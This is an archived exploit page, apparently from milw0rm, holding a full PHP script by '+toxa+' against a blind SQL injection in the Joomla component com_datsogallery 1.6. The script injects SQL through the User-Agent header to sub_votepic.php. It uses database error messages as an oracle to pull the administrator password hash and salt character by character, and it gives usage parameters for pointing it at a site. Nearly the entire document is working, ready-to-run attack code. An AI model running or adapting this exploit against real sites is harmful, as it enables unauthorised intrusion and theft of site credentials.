<html><head><title>Joomla Component com_datsogallery 1.6 Blind SQL Injection Exploit</title></head><pre>&lt;?
//Joomla Component com_datsogallery 1.6 Blind SQL Injection Exploit by +toxa+
//Greets: all members of antichat.ru &amp; cih.ms 

//options
set_time_limit(0);
ignore_user_abort(1);
$norm_ua='Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14';
$url=$_GET['url'];
$where=(!empty($_GET['user']))?&quot;where username='&quot;.$_GET['user'].&quot;'&quot;:'limit 0,1';
$id=(!empty($_GET['id']))?$_GET['id']:'1';

//functions
function send_xpl($url, $xpl){
	global $id;
	$u=parse_url($url);
	$req =&quot;GET &quot;.$u['path'].&quot;components/com_datsogallery/sub_votepic.php?id=$id&amp;user_rating=1 HTTP/1.1\r\n&quot;;
	$req.=&quot;Host: &quot;.$u['host'].&quot;\r\n&quot;;
	$req.=&quot;User-Agent: &quot;.$xpl.&quot;\r\n&quot;;
	$req.=&quot;Connection: Close\r\n\r\n&quot;;
	$fs=fsockopen($u['host'], 80, $errno, $errstr, 30) or die(&quot;error: $errno - $errstr&lt;br&gt;\n&quot;);
	fwrite($fs, $req);
	$res=fread($fs, 4096);  
	fclose($fs);
	return $res;
}

function xpl($condition, $pos){
	global $norm_ua;
	global $where;
	$xpl=rand(1,100000).&quot;'),(1,if(ascii(substring((select password from #__users $where),$pos,1))$condition,(select '$norm_ua'),(select link from #__menu)))/*&quot;;
	return $xpl;
}

//main
echo '&lt;title&gt;Joomla Component com_datsogallery 1.6 Blind SQL Injection Exploit by +toxa+&lt;/title&gt;';
if(empty($url)) die($_SERVER['SCRIPT_NAME'].&quot;?url=[url]&amp;user=[username]&amp;id=[pic_id]\n&lt;br&gt;username&amp;pic_id - optional\n&quot;);
send_xpl($url, $norm_ua);

//get md5
for($i=0;$i&lt;=32;$i++){
	$buff=send_xpl($url,xpl('&gt;58', $i));
	if(preg_match('/Duplicate entry/', $buff)){
		for($j=97;$j&lt;=102;$j++){
			if(preg_match('/Duplicate entry/', send_xpl($url, xpl('='.$j,$i)))){ $pass.=chr($j); break; }
		}
	} elseif(preg_match('/Subquery returns more than 1 row/', $buff)){
		for($j=48;$j&lt;=57;$j++){
			if(preg_match('/Duplicate entry/', send_xpl($url, xpl('='.$j,$i)))){ $pass.=chr($j); break; }
		}
	} else {
		die(&quot;exploit failed&quot;);
	}
}

//check Joomla version
$test=rand(1,100000).&quot;'),(1,if((select length(password) from #__users $where)=32,(select '$norm_ua'),(select link from #__menu)))/*&quot;;
$buff=send_xpl($url,$test);
if(preg_match('/Duplicate entry/', $buff)) die($pass);

//separator
$pass.=':';

//get salt
for($i=33;$i&lt;=49;$i++){
	$buff=send_xpl($url,xpl('&gt;58', $i));
	if(preg_match('/Duplicate entry/', $buff)){
		$buff=send_xpl($url, xpl('&gt;91',$i));
		if(preg_match('/Duplicate entry/', $buff)){
			for($j=97;$j&lt;=122;$j++){
				if(preg_match('/Duplicate entry/', send_xpl($url, xpl('='.$j,$i)))){ $pass.=chr($j); break; }
			}
		} elseif(preg_match('/Subquery returns more than 1 row/', $buff)){
			for($j=65;$j&lt;=90;$j++){
				if(preg_match('/Duplicate entry/', send_xpl($url, xpl('='.$j,$i)))){ $pass.=chr($j); break; }
			}
		} else {
			die(&quot;exploit failed&quot;);
		}
	} elseif(preg_match('/Subquery returns more than 1 row/', $buff)){
			for($j=48;$j&lt;=57;$j++){
				if(preg_match('/Duplicate entry/', send_xpl($url, xpl('='.$j,$i)))){ $pass.=chr($j); break; }
			}
	} else {
		die(&quot;exploit failed&quot;);
	}
}
echo $pass;

# milw0rm.com [2008-05-10]</pre></html>